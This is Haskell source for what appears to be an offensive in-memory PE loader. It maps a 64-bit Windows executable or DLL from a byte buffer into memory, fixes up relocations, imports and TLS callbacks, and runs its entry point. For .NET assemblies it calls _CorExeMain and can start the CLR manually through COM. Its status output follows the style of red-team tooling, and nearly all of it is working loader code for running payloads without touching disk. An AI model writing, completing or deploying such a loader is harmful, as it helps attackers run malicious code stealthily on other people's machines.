loadPEFromMemory :: BS.ByteString -> IO ()
loadPEFromMemory peData = BSU.unsafeUseAsCStringLen peData $ \(dataPtr, dataLen) -> do
  putStrLn $ "[*] PE data length: " ++ show dataLen
  hFlush stdout

  when (dataLen < 64) $ error "PE data too small"

  dosHeader <- peek (castPtr dataPtr :: Ptr ImageDosHeader)
  when (dos_e_magic dosHeader /= 0x5A4D) $ error "Invalid MZ signature"

  let ntOffset = fromIntegral $ dos_e_lfanew dosHeader
  let ntPtr = plusPtr dataPtr ntOffset :: Ptr ImageNtHeaders64
  ntHeaders <- peek ntPtr

  when (nt_signature ntHeaders /= 0x4550) $ error "Invalid PE signature"

  let optHeader = nt_optionalHeader ntHeaders
  when (oh_magic optHeader /= 0x20b) $ error "Only 64-bit PE files supported"

  let imageSize = fromIntegral $ oh_sizeOfImage optHeader
  let imageSizeC = fromIntegral imageSize :: CSize
  imageBase <- c_VirtualAlloc nullPtr imageSizeC (mEM_COMMIT .|. mEM_RESERVE) pAGE_READWRITE
  when (imageBase == nullPtr) $ error "VirtualAlloc failed"

  let imageBasePtr = castPtr imageBase :: Ptr Word8
  copyBytes imageBasePtr (castPtr dataPtr) (fromIntegral $ oh_sizeOfHeaders optHeader)

  let fileHeader = nt_fileHeader ntHeaders
      numSections = fromIntegral $ fh_numberOfSections fileHeader
      sectionHeaderPtr = plusPtr ntPtr (4 + 20 + fromIntegral (fh_sizeOfOptionalHeader fileHeader))

  forM_ [0..numSections-1] $ \i -> do
    section <- peekElemOff sectionHeaderPtr i
    when (sec_sizeOfRawData section > 0) $ do
      let dest = plusPtr imageBasePtr (fromIntegral $ sec_virtualAddress section)
          src = plusPtr dataPtr (fromIntegral $ sec_pointerToRawData section)
      copyBytes dest src (fromIntegral $ sec_sizeOfRawData section)

  let ntHeadersInMem = castPtr imageBasePtr `plusPtr` ntOffset :: Ptr ImageNtHeaders64

  processRelocations imageBasePtr ntHeadersInMem
  resolveImports imageBasePtr ntHeadersInMem
  finalizeSections imageBasePtr ntHeadersInMem
  processTlsCallbacks imageBasePtr ntHeadersInMem

  comDir <- getDataDirectory ntHeadersInMem iMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR
  comDirData <- peek comDir
  
  if dd_virtualAddress comDirData /= 0 && dd_size comDirData /= 0
    then do
      putStrLn "[*] Detected .NET assembly. Attempting to execute."
      hFlush stdout

      -- CRITICAL: Set up the PE headers that _CorExeMain expects
      -- _CorExeMain needs to find the DOS and NT headers
      putStrLn "[*] Setting up PE environment for CLR..."
      hFlush stdout
      
      -- Get the DOS header and verify
      let dosHeaderInMem = castPtr imageBasePtr :: Ptr ImageDosHeader
      dosHdr <- peek dosHeaderInMem
      putStrLn $ "[*] DOS signature in memory: 0x" ++ showHex (dos_e_magic dosHdr) ""
      
      -- Get NT headers
      let ntOffset = fromIntegral (dos_e_lfanew dosHdr)
      let ntHeadersPtr = plusPtr imageBasePtr ntOffset :: Ptr ImageNtHeaders64
      ntHdrs <- peek ntHeadersPtr
      putStrLn $ "[*] NT signature in memory: 0x" ++ showHex (nt_signature ntHdrs) ""
      hFlush stdout
      
      -- Try calling _CorExeMain directly - it should bootstrap the CLR
      putStrLn "[*] Calling _CorExeMain (CLR will auto-initialize)..."
      hFlush stdout
      
      result <- try (c_CorExeMain imageBase) :: IO (Either SomeException Int32)
      case result of
        Left ex -> do
          putStrLn $ "[!] _CorExeMain threw exception: " ++ show ex
          putStrLn "[*] Attempting manual CLR initialization..."
          hFlush stdout
          manualCLRInit imageBase imageBasePtr
        Right exitCode -> do
          putStrLn $ "[+] _CorExeMain returned with exit code: " ++ show exitCode
          hFlush stdout
    else do
      -- NATIVE PE LOADING
      optHeaderInMem <- nt_optionalHeader <$> peek ntHeadersInMem
      let entryPointRVA = oh_addressOfEntryPoint optHeaderInMem
          entryPointPtr = plusPtr imageBasePtr (fromIntegral entryPointRVA)
          subsystem = oh_subsystem optHeaderInMem

      when (entryPointRVA == 0) $ error "Invalid entry point"

      putStrLn $ "[*] Native Execution: Subsystem " ++ show subsystem
      hFlush stdout

      if subsystem == 2 || subsystem == 3
        then do
          let entryFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (IO Int32)
          _ <- mkEntryPoint entryFunPtr
          return ()
        else do
          let dllMainFunPtr = castPtrToFunPtr entryPointPtr :: FunPtr (Ptr () -> Word32 -> Ptr () -> IO Int32)
          _ <- mkDllMain dllMainFunPtr imageBase dLL_PROCESS_ATTACH nullPtr
          return ()

manualCLRInit :: Ptr () -> Ptr Word8 -> IO ()
manualCLRInit imageBase imageBasePtr = do
  -- Initialize COM
  hrCom <- c_CoInitializeEx nullPtr 0
  when (hrCom < 0 && hrCom /= (-2147417850)) $ do
    putStrLn $ "[-] COM initialization failed: HRESULT = 0x" ++ showHex (fromIntegral hrCom :: Word32) ""
    hFlush stdout
  putStrLn "[*] COM initialized."
  hFlush stdout
  
  maybeHost <- getCLRRuntimeHost
  case maybeHost of
    Nothing -> do
      putStrLn "[-] Could not obtain ICLRRuntimeHost."
      putStrLn "[-] The .NET assembly cannot execute without CLR host."
      hFlush stdout
    Just hostPtr -> do
      putStrLn $ "[*] Got CLR host at: 0x" ++ showHex (ptrToWordPtr hostPtr) ""
      hFlush stdout
      
      -- Get VTable
      vtablePtr <- peek (castPtr hostPtr :: Ptr (Ptr (Ptr ())))
      
      -- Get Start function
      pStartRaw <- peekElemOff vtablePtr 3
      let pStartFunc = castPtrToFunPtr pStartRaw :: FunPtr (Ptr () -> IO HRESULT)
      
      putStrLn "[*] Starting CLR..."
      hFlush stdout
      hrStart <- mkCLRStart pStartFunc hostPtr
      
      if hrStart < 0 
        then putStrLn $ "[-] CLR Start failed: HRESULT = 0x" ++ showHex (fromIntegral hrStart :: Word32) ""
        else putStrLn "[+] CLR started."
      hFlush stdout
      
      -- Retry _CorExeMain
      putStrLn "[*] Retrying _CorExeMain..."
      hFlush stdout
      exitCode <- c_CorExeMain imageBase
      putStrLn $ "[*] _CorExeMain returned: " ++ show exitCode
      hFlush stdout

